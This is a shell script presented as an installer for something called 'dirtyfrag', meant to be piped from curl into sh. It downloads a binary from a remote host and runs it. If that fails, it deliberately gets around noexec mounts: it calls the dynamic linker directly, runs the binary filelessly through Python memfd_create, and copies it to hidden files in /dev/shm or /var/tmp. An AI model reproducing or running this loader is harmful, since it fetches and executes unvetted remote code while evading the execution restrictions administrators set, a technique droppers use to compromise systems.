#!/bin/sh
# Verbose installer for dirtyfrag
# Use:  curl -fsSL https://dirtyfrag.l5z12.dev/install | sh
set -eu

ORIGIN="${ORIGIN:-https://dirtyfrag.l5z12.dev}"

log() { printf '[install] %s\n' "$*" >&2; }
die() { printf '[install] ERROR: %s\n' "$*" >&2; exit 1; }

log "starting installer"
log "origin: $ORIGIN"

# ---- detect arch ----
raw_arch=$(uname -m 2>/dev/null || echo unknown)
log "uname -m: $raw_arch"

case "$raw_arch" in
  x86_64|amd64)              arch=x86_64 ;;
  aarch64|arm64)             arch=aarch64 ;;
  armv7l|armv7|armhf)        arch=armv7 ;;
  i386|i486|i586|i686)       arch=i386 ;;
  *) die "unsupported arch '$raw_arch'" ;;
esac
log "resolved arch: $arch"

# ---- check tools ----
command -v curl   >/dev/null 2>&1 || die "curl not found"
command -v mktemp >/dev/null 2>&1 || die "mktemp not found"
command -v chmod  >/dev/null 2>&1 || die "chmod not found"
log "required tools present"

# ---- temp file ----
tmp=$(mktemp 2>/dev/null) || die "mktemp failed"
log "temp file: $tmp"
trap 'log "cleaning up $tmp"; rm -f "$tmp"' EXIT INT TERM

# ---- check /tmp is exec ----
if mount 2>/dev/null | grep -E " on $(dirname "$tmp") " | grep -q noexec; then
  log "WARNING: $(dirname "$tmp") is mounted noexec, trying \$HOME instead"
  rm -f "$tmp"
  tmp="${HOME:-.}/.dirtyfrag.$$"
  log "new temp file: $tmp"
fi

# ---- download ----
url="${ORIGIN}/bin?arch=${arch}"
log "downloading: $url"
if ! curl -fSL --progress-bar "$url" -o "$tmp"; then
  die "download failed"
fi
size=$(wc -c < "$tmp" 2>/dev/null || echo "?")
log "downloaded $size bytes"

# ---- chmod ----
log "chmod +x $tmp"
chmod +x "$tmp" || log "WARNING: chmod failed (likely noexec), will try fallback methods"

# ---- run with noexec fallback methods ----
run_binary() {
  local bin="$1"
  shift

  # Method 1: direct exec
  log "method 1: direct exec"
  if [ -e /dev/tty ]; then
    "$bin" "$@" </dev/tty && return 0
  else
    "$bin" "$@" && return 0
  fi

  log "direct exec failed, trying noexec bypass methods..."

  # Method 2: ld-linux dynamic linker
  log "method 2: ld-linux dynamic linker"
  if command -v readelf >/dev/null 2>&1 && readelf -d "$bin" 2>/dev/null | grep -q NEEDED; then
    for ld in \
      /lib64/ld-linux-x86-64.so.2 \
      /lib/ld-linux-aarch64.so.1 \
      /lib/ld-linux-armhf.so.3 \
      /lib/ld-linux.so.2
    do
      if [ -x "$ld" ]; then
        log "trying ld.so: $ld"
        if [ -e /dev/tty ]; then
          "$ld" "$bin" "$@" </dev/tty && return 0
        else
          "$ld" "$bin" "$@" && return 0
        fi
      fi
    done
  else
    log "binary is statically linked or readelf unavailable, skipping ld.so"
  fi

  # Method 3: Python memfd_create (anonymous in-memory fd, tidak terikat filesystem)
  # Tidak ada </dev/tty di sini — heredoc butuh stdin
  # /dev/tty dibuka ulang di dalam Python sebelum execve
  log "method 3: Python memfd_create"
  for py in python3 python python2; do
    if command -v "$py" >/dev/null 2>&1; then
      log "trying memfd_create via $py"
      "$py" - "$bin" "$@" <<'PYEOF'
import sys, os, ctypes, ctypes.util, platform

bin_path = sys.argv[1]
args     = sys.argv[1:]

sys.stderr.write('[memfd] reading binary: %s\n' % bin_path)
with open(bin_path, 'rb') as f:
    data = f.read()
sys.stderr.write('[memfd] read %d bytes\n' % len(data))

fd = -1
try:
    fd = os.memfd_create("anon", 0)
    sys.stderr.write('[memfd] used os.memfd_create, fd=%d\n' % fd)
except AttributeError:
    syscall_nr = {
        'x86_64': 319, 'amd64': 319,
        'aarch64': 279, 'arm64': 279,
        'armv7l': 356,  'armv7': 356,
        'i386':   356,  'i686':  356,
    }.get(platform.machine(), 319)
    sys.stderr.write('[memfd] syscall nr=%d for %s\n' % (syscall_nr, platform.machine()))
    libc = ctypes.CDLL(ctypes.util.find_library('c') or 'libc.so.6', use_errno=True)
    fd = libc.syscall(
        ctypes.c_long(syscall_nr),
        ctypes.c_char_p(b"anon"),
        ctypes.c_uint(0)
    )

if fd < 0:
    sys.stderr.write('[memfd] memfd_create failed errno=%d\n' % ctypes.get_errno())
    sys.exit(1)

sys.stderr.write('[memfd] fd=%d, writing binary...\n' % fd)
os.write(fd, data)

try:
    tty = os.open('/dev/tty', os.O_RDWR)
    os.dup2(tty, 0)
    os.close(tty)
    sys.stderr.write('[memfd] stdin reattached to /dev/tty\n')
except OSError as e:
    sys.stderr.write('[memfd] WARNING: could not open /dev/tty: %s\n' % e)

sys.stderr.write('[memfd] execve /proc/self/fd/%d\n' % fd)
os.execve('/proc/self/fd/%d' % fd, args, os.environ)
PYEOF
      py_ret=$?
      [ $py_ret -eq 0 ] && return 0
    fi
  done

  # Method 4: copy ke path yang exec-friendly
  log "method 4: copy to exec-friendly path"
  uid=$(id -u 2>/dev/null || echo 0)
  for alt_dir in /dev/shm /run "/run/user/${uid}" /var/tmp; do
    if [ -d "$alt_dir" ] && [ -w "$alt_dir" ]; then
      alt="${alt_dir}/.run.$$"
      log "copying binary to $alt"
      if cp "$bin" "$alt" && chmod +x "$alt"; then
        if [ -e /dev/tty ]; then
          "$alt" "$@" </dev/tty
        else
          "$alt" "$@"
        fi
        ret=$?
        rm -f "$alt"
        [ $ret -eq 0 ] && return 0
      fi
      rm -f "$alt" 2>/dev/null || true
    fi
  done

  die "all exec methods failed (noexec filesystem, no Python, no exec-friendly path available)"
}

# ---- main ----
log "executing $tmp $*"
log "(noexec-aware: direct → ld.so → memfd → alt-path)"
log "------------------------------------------------------------"

run_binary "$tmp" "$@"
